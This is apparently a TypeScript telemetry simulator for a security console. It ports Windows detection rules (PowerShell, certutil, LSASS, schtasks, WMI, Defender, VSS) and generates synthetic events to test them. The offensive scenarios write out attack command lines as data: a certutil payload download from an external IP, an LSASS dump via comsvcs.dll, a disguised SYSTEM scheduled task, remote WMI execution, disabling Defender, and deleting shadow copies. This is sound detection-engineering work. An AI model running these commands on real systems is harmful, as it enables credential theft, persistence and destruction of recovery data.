// Telemetry simulator for the security-framework console.
// Ports the devsensor scenarios (cmd/devsensor) and the detection rules
// (rules/windows/*.yaml) to TypeScript so the web console can run the
// full pipeline without a live Go engine. The event schema mirrors
// pkg/model exactly: one NDJSON line, one row in the console.

export type SfEvent = {
  id: string
  timestamp: string
  type: string
  source: string
  host: string
  user?: string
  process?: {
    pid: number
    ppid?: number
    name: string
    command_line?: string
    image?: string
  }
  file?: {
    path: string
    extension?: string
    size_bytes?: number
  }
  network?: {
    protocol?: string
    source_ip?: string
    source_port?: number
    destination_ip?: string
    destination_port?: number
    domain?: string
  }
  tags?: string[]
  enrichment?: Record<string, string>
}

export type SfAlert = {
  id: string
  timestamp: string
  rule_id: string
  rule_name: string
  severity: 'high' | 'critical' | 'medium' | 'low'
  host: string
  user?: string
  event_id: string
  event_type: string
  summary: string
  matched_on: string[]
  tags: string[]
}

export type RuleMeta = {
  id: string
  name: string
  description: string
  severity: SfAlert['severity']
  event_type: string
  mitre: string
  tactic: string
  tags: string[]
  conditions: { field: string; operator: string; value: string | string[] }[]
}

// ---------------------------------------------------------------------------
// Rules (1:1 port of rules/windows/*.yaml)

export const RULES: RuleMeta[] = [
  {
    id: '9f31c2a4-5d7b-4e18-8a02-3b9c6d1e7f40',
    name: 'PowerShell con comando codificado',
    description:
      'Detecta la ejecución de PowerShell con parámetros de ofuscación típicos: -enc/-encodedcommand, -w hidden y -nop. Técnica clásica de ejecución que evita dejar la intención visible en la línea de comandos.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1059.001',
    tactic: 'Command and Scripting Interpreter: PowerShell',
    tags: ['attack.t1059.001', 'attack.execution'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'powershell.exe' },
      { field: 'process.command_line', operator: 'contains', value: '-enc' },
    ],
  },
  {
    id: 'c1d24e9b-7a03-4c56-9f11-8e2b5a4d9c73',
    name: 'Descarga con certutil o bitsadmin',
    description:
      'Detecta transferencia de ficheros con binarios LOLBas: certutil con -urlcache o bitsadmin con /transfer hacia destinos externos, técnica habitual para descargar payloads evadiendo políticas de aplicación.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1105',
    tactic: 'Command and Control: Ingress Tool Transfer',
    tags: ['attack.t1105', 'attack.command-and-control'],
    conditions: [
      { field: 'process.name', operator: 'in', value: ['certutil.exe', 'bitsadmin.exe'] },
      { field: 'process.command_line', operator: 'contains_any', value: ['-urlcache', '/transfer'] },
    ],
  },
  {
    id: '5b7e1f38-2c94-4d0a-b6e7-19a8c3d54f02',
    name: 'Volcado de LSASS via comsvcs.dll',
    description:
      'Detecta el volcado de memoria de LSASS cargando comsvcs.dll con MiniDump desde rundll32.exe, técnica de acceso a credenciales que evita binarios ofensivos dedicados en disco.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1003.001',
    tactic: 'OS Credential Dumping: LSASS Memory',
    tags: ['attack.t1003.001', 'attack.credential-access'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'rundll32.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'comsvcs.dll' },
      { field: 'process.command_line', operator: 'contains', value: 'MiniDump' },
    ],
  },
  {
    id: 'e8a1c72d-4b6f-4f39-9a52-0d3b7c5f1a11',
    name: 'Creación de tarea programada',
    description:
      'Detecta la creación de tareas programadas con schtasks.exe, un mecanismo clásico de persistencia y ejecución remota que sobrevive a reinicios y se disimula bien entre tareas legítimas del sistema.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1053.005',
    tactic: 'Scheduled Task/Job: Scheduled Task',
    tags: ['attack.t1053.005', 'attack.persistence'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'schtasks.exe' },
      { field: 'process.command_line', operator: 'contains', value: '/create' },
    ],
  },
  {
    id: 'f3b2d98e-7c15-4a58-8e0a-2c4d6e8f0b22',
    name: 'Ejecución de procesos via WMI',
    description:
      'Detecta la creación de procesos mediante WMI (wmic process call create), técnica de ejecución y movimiento lateral que apenas deja rastro en disco y abusa de herramientas administrativas nativas.',
    severity: 'high',
    event_type: 'process.create',
    mitre: 'T1047',
    tactic: 'Windows Management Instrumentation',
    tags: ['attack.t1047', 'attack.execution'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'wmic.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'process call create' },
    ],
  },
  {
    id: 'a7c4e5f1-9d28-4b36-8f47-1e5a9c3d6b33',
    name: 'Manipulación de Windows Defender',
    description:
      'Detecta intentos de debilitar Windows Defender desde PowerShell: desactivar la protección en tiempo real, el monitoreo de comportamiento o añadir exclusiones para esconder payloads.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1562.001',
    tactic: 'Impair Defenses: Disable or Modify Tools',
    tags: ['attack.t1562.001', 'attack.defense-evasion'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'powershell.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'Set-MpPreference' },
      { field: 'process.command_line', operator: 'contains_any', value: ['-DisableRealtimeMonitoring', '-DisableBehaviorMonitoring', '-ExclusionPath'] },
    ],
  },
  {
    id: 'b8d5f6e2-0e39-4c47-9a58-2f6b0d4e7c44',
    name: 'Borrado de instantáneas VSS',
    description:
      'Detecta el borrado de instantáneas de sombra con vssadmin, paso típico de ransomware para impedir la recuperación del sistema antes del cifrado masivo de ficheros.',
    severity: 'critical',
    event_type: 'process.create',
    mitre: 'T1490',
    tactic: 'Inhibit System Recovery',
    tags: ['attack.t1490', 'attack.impact'],
    conditions: [
      { field: 'process.name', operator: 'eq', value: 'vssadmin.exe' },
      { field: 'process.command_line', operator: 'contains', value: 'delete shadows' },
    ],
  },
]

function field(ev: SfEvent, path: string): string | undefined {
  if (path === 'process.name') return ev.process?.name
  if (path === 'process.command_line') return ev.process?.command_line
  if (path === 'process.image') return ev.process?.image
  if (path === 'file.path') return ev.file?.path
  if (path === 'network.domain') return ev.network?.domain
  return undefined
}

function matchesCondition(ev: SfEvent, c: RuleMeta['conditions'][number]): boolean {
  const v = field(ev, c.field)
  if (v === undefined) return false
  if (c.operator === 'eq') return v === c.value
  if (c.operator === 'contains') return v.includes(c.value as string)
  if (c.operator === 'contains_any')
    return (c.value as string[]).some((s) => v.includes(s))
  if (c.operator === 'in') return (c.value as string[]).includes(v)
  return false
}

/** Returns the list of matched field paths, or null when the rule does not fire. */
export function evaluate(rule: RuleMeta, ev: SfEvent): string[] | null {
  if (ev.type !== rule.event_type) return null
  const matched: string[] = []
  for (const c of rule.conditions) {
    if (!matchesCondition(ev, c)) return null
    if (!matched.includes(c.field)) matched.push(c.field)
  }
  return matched
}

// ---------------------------------------------------------------------------
// Scenario generator (devsensor parity, plus extra benign noise)

const HOSTS = ['LAB-WKS-01', 'LAB-WKS-02', 'LAB-SRV-DC01']
const USERS = ['CORP\\jdoe', 'CORP\\mrodriguez', 'CORP\\aalvarez', 'CORP\\svc_backup']

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randPid(): number {
  return 2000 + Math.floor(Math.random() * 6000)
}

function nowIso(): string {
  return new Date().toISOString()
}

type Scenario = {
  weight: number
  offensive: boolean
  make: () => SfEvent
}

const SCENARIOS: Scenario[] = [
  {
    weight: 9,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'explorer.exe',
        image: 'C:\\Windows\\explorer.exe',
      },
    }),
  },
  {
    weight: 8,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'notepad.exe',
        command_line: '"C:\\Windows\\system32\\NOTEPAD.EXE" C:\\Users\\jdoe\\Documents\\notas-reunion.txt',
        image: 'C:\\Windows\\System32\\notepad.exe',
      },
    }),
  },
  {
    weight: 8,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'network.connect',
      source: 'etw-microsoft-windows-kernel-network',
      host: pick(HOSTS),
      user: pick(USERS),
      network: {
        protocol: 'tcp',
        source_ip: '10.0.4.42',
        source_port: 50000 + Math.floor(Math.random() * 8000),
        destination_ip: '142.250.200.36',
        destination_port: 443,
        domain: 'www.google.com',
      },
    }),
  },
  {
    weight: 7,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'chrome.exe',
        command_line: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
        image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      },
    }),
  },
  {
    weight: 6,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'file.write',
      source: 'etw-microsoft-windows-fileio',
      host: pick(HOSTS),
      user: pick(USERS),
      file: {
        path: 'C:\\Users\\jdoe\\Documents\\informe-trimestral.docx',
        extension: '.docx',
        size_bytes: 48120 + Math.floor(Math.random() * 90000),
      },
    }),
  },
  {
    weight: 5,
    offensive: false,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.terminate',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: { pid: randPid(), name: 'notepad.exe' },
    }),
  },
  {
    weight: 5,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'powershell.exe',
        command_line: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      },
    }),
  },
  {
    weight: 4,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'certutil.exe',
        command_line: 'certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\\Users\\Public\\payload.exe',
        image: 'C:\\Windows\\System32\\certutil.exe',
      },
    }),
  },
  {
    weight: 3,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'rundll32.exe',
        command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 744 C:\\Windows\\Temp\\lsass.dmp full',
        image: 'C:\\Windows\\System32\\rundll32.exe',
      },
    }),
  },
  {
    weight: 3,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'schtasks.exe',
        command_line: 'schtasks.exe /create /tn "MicrosoftEdgeUpdaterCore" /sc onlogon /ru SYSTEM /tr "C:\\Users\\Public\\payload.exe"',
        image: 'C:\\Windows\\System32\\schtasks.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'wmic.exe',
        command_line: 'wmic.exe /node:LAB-WKS-02 process call create "cmd.exe /c C:\\Users\\Public\\payload.exe"',
        image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'powershell.exe',
        command_line: 'powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      },
    }),
  },
  {
    weight: 2,
    offensive: true,
    make: () => ({
      id: crypto.randomUUID(),
      timestamp: nowIso(),
      type: 'process.create',
      source: 'etw-microsoft-windows-process',
      host: pick(HOSTS),
      user: pick(USERS),
      process: {
        pid: randPid(),
        ppid: randPid(),
        name: 'vssadmin.exe',
        command_line: 'vssadmin.exe delete shadows /all /quiet',
        image: 'C:\\Windows\\System32\\vssadmin.exe',
      },
    }),
  },
]

const TOTAL_WEIGHT = SCENARIOS.reduce((acc, s) => acc + s.weight, 0)

function nextScenario(): Scenario {
  let roll = Math.random() * TOTAL_WEIGHT
  for (const s of SCENARIOS) {
    roll -= s.weight
    if (roll <= 0) return s
  }
  return SCENARIOS[0]
}

function truncate(s: string, max: number): string {
  return s.length > max ? s.slice(0, max - 1) + '\u2026' : s
}

export function summarize(ev: SfEvent): string {
  if (ev.process) {
    const cmd = ev.process.command_line ? ` ${ev.process.command_line}` : ''
    return truncate(`${ev.process.name}${cmd}`, 110)
  }
  if (ev.network) {
    return truncate(`${ev.network.protocol} ${ev.network.destination_ip}:${ev.network.destination_port} (${ev.network.domain ?? 'sin dominio'})`, 110)
  }
  if (ev.file) return truncate(ev.file.path, 110)
  return ev.type
}

export function enrich(ev: SfEvent): Record<string, string> {
  const out: Record<string, string> = {}
  if (ev.process?.image) {
    out['image_origin'] = ev.process.image.toLowerCase().startsWith('c:\\windows\\') ? 'system' : 'userland'
  }
  if (ev.user) {
    const [domain, name] = ev.user.split('\\')
    if (domain && name) {
      out['user_domain'] = domain
      out['user_name'] = name
    }
  }
  return out
}

// ---------------------------------------------------------------------------
// Simulation engine with rule evaluation, 60s alert dedup and rolling stats

export type SimStats = {
  events_total: number
  alerts_total: number
  by_severity: Record<string, number>
  events_per_min: number
  uptime_s: number
  interval_ms: number
  mode: 'simulacion'
}

export class SimEngine {
  private startedAt = Date.now()
  private eventsTotal = 0
  private alertsTotal = 0
  private bySeverity: Record<string, number> = {}
  private recentTimestamps: number[] = []
  private lastAlertPerRule = new Map<string, number>()
  private timer: ReturnType<typeof setInterval> | null = null
  private statsTimer: ReturnType<typeof setInterval> | null = null

  constructor(
    private onEvent: (ev: SfEvent) => void,
    private onAlert: (al: SfAlert) => void,
    private onStats: (st: SimStats) => void,
    private intervalMs = 1600,
  ) {}

  start() {
    if (this.timer) return
    this.timer = setInterval(() => this.tick(), this.intervalMs)
    this.statsTimer = setInterval(() => this.onStats(this.stats()), 2000)
  }

  stop() {
    if (this.timer) clearInterval(this.timer)
    if (this.statsTimer) clearInterval(this.statsTimer)
    this.timer = null
    this.statsTimer = null
  }

  tick() {
    const ev = nextScenario().make()
    ev.enrichment = enrich(ev)
    this.eventsTotal++
    this.recentTimestamps.push(Date.now())
    this.onEvent(ev)

    for (const rule of RULES) {
      const matched = evaluate(rule, ev)
      if (!matched) continue
      const last = this.lastAlertPerRule.get(rule.id) ?? 0
      if (Date.now() - last < 60_000) continue // same dedup window as internal/alert
      this.lastAlertPerRule.set(rule.id, Date.now())
      const alert: SfAlert = {
        id: crypto.randomUUID(),
        timestamp: nowIso(),
        rule_id: rule.id,
        rule_name: rule.name,
        severity: rule.severity,
        host: ev.host,
        user: ev.user,
        event_id: ev.id,
        event_type: ev.type,
        summary: summarize(ev),
        matched_on: matched,
        tags: rule.tags,
      }
      this.alertsTotal++
      this.bySeverity[alert.severity] = (this.bySeverity[alert.severity] ?? 0) + 1
      this.onAlert(alert)
    }
  }

  stats(): SimStats {
    const cutoff = Date.now() - 60_000
    this.recentTimestamps = this.recentTimestamps.filter((t) => t >= cutoff)
    return {
      events_total: this.eventsTotal,
      alerts_total: this.alertsTotal,
      by_severity: { ...this.bySeverity },
      events_per_min: this.recentTimestamps.length,
      uptime_s: Math.floor((Date.now() - this.startedAt) / 1000),
      interval_ms: this.intervalMs,
      mode: 'simulacion',
    }
  }
}
